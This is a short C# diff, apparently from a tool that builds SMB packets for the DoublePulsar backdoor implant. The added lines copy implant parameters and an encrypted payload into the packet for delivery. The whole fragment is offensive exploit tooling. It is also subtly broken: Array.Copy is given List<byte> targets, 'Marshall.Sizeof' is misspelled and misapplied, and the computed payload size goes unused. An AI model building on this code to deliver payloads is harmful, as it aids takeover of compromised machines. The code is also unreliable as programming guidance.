@@ -216,13 +216,24 @@ namespace DoublePulsar
 
             List<byte> Parameters = new List<byte>();
             Parameters.AddRange(Enumerable.Repeat((byte)0x00, 12));
+            
             //copy doublepulsar parameters to parameters here
+            Array.Copy(parameters, Parameters, 12);
+            
+            //append the parameteters to the end of pkt
             pkt = pkt.Concat(Parameters.ToArray()).ToArray(); //Collect it all
 
+            //SMBData dynamic generation
+            int DataSize = Marshall.Sizeof(encrypted_payload);
+            
             List<byte> SMBData = new List<byte>();
             SMBData.AddRange(Enumerable.Repeat((byte)0x00, 4096));
+            //SMBData.AddRange(Enumerable.Repeat((byte)0x00, DataSize));
 
             //copy doublepulsar exec data to SMBData here
+            Array.Copy(encrypted_payload, SMBData, DataSize);
+            
+            //append it to the end of pkt
             pkt = pkt.Concat(SMBData.ToArray()).ToArray(); //Collect it all
 
             return pkt;
